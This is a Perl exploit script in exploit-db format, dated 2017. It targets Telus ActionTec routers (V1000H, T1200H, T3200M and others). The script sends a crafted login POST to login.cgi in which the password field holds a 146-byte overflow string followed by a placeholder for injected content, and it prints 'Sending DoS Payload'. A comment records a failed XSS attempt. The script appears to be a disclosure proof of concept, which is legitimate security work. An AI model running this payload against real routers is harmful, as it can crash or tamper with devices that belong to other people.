#/usr/bin/perl

# Exploit Title: Telus ActionTec Router Eval
# Date: January 19, 2017
# Exploit Author: Julien Bedard
# Vendor Homepage: https://www.actiontec.com , https://www.telus.com
# Software Link: http://opensource.actiontec.com
# Version: V1000H, V2000H, T1200H, T2200H and T3200M Routers
# Tested on: Confirmed on All Firwmware versions with help of Telus Security Labs


#
# First thanks for http://telussecuritylabs.com who confirmed the vulnerability
# in all router equipments and for quick and fast reply and remediation.
#
# Second this exploit is a very quick version made to Proof the vulnerability
# is fully working.
#
# Julien Bedard - https://www.upwork.com/freelancers/~01d2249087c907f120
# Other exploits: https://www.exploit-db.com/author/?a=1416
#

use LWP::UserAgent;

$cmd = $ARGV[0];

print <<EOF;
               _ _       \\ \
    .-"""""-. / \\_> /\\    |/
   /         \\.'`  `',.--//
 -(    BUG    I      I  @@\
   \\         /'.____.'\\___|
    '-.....-' __/ | \\   (`)
             /   /  /
                 \\  \

   Telus Actiontec T1200H Eval
          By Julien Bedard 
                                                                                                                                                                   
EOF

my $login_url = "http://192.168.1.254:80/login.cgi";


my $ua = LWP::UserAgent->new;
$variable_test = 'FIREWAL ENABLE OR DISABLE INJECT RIGHT HERE';

$overflow = 'A' x 146 . $variable_test;

print "[+] Sending DoS Payload\n";
my $req = HTTP::Request->new(POST => $login_url);
$req->header('Referer' => 'http://192.168.1.254/');
$req->header('Content-Type' => 'application/x-www-form-urlencoded');
my $post_data = 'inputUserName=root&inputPassword=' . $overflow . '&nothankyou=1'; #XSS (there's good filtering in place, I wasn't able to return back any JS, with all bypassing filter techniques I know)

$req->content($post_data);
my $resp = $ua->request($req);


